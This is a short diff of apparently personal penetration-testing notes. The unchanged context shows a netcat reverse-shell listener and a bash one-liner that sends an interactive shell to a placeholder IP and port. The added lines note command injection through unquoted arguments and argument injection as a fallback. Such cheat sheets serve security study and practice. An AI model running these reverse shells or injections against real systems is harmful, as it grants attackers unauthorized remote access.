@@ -136,3 +136,7 @@ Check /etc/ssh/ssh_config for the ssh config
 - Listener(on my machine): `nc -nvlp [PORT]`
 - Senders:
   - Bash: `bash  -i >& /dev/tcp/[IP]/[PORT] 0>&1 `
+
+## Misc
+- If arguments are not in quotes, we can inject commands
+- If command injection is not possible, we an inject arguments to a command
